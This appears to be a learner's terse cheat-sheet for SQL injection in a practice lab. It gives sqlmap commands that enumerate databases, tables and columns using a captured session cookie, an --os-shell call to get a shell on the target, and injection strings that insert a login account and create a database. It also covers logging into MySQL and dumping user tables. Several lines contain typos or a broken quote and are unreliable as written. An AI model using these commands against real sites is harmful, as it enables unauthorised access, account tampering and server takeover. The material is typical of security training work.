Tools 
1) N staltker web vuln analysis
2) In the vuln web app go to console type document.cookie
	1) get the cookie value
	2) `sqlmap -u "http://IP?id=?" --cookie="X" --dbs`
to insert a username into the database we can user
`blah;insert into login values ('john',apple123');--`

then login using john as user  and apple123 as pass


To create a database 
`blah;create database mydatabase;--`  


sqlmap -r request.txt from burp 

sqlmap -r request.txt --dbs
sqlmap -r request.txt -D database_name --tables
sqlmap -r request.txt -D database_name -T table_name --columns
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell


mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
<br> </br>
show databases;
use database_name
show tables ;
select * from users;
show dtabases;
use staff;
show tables;
select * from login;
select * from user;
When you have username and Password for the database.


https://www.youtube.com/watch?v=iD84waJKYh0


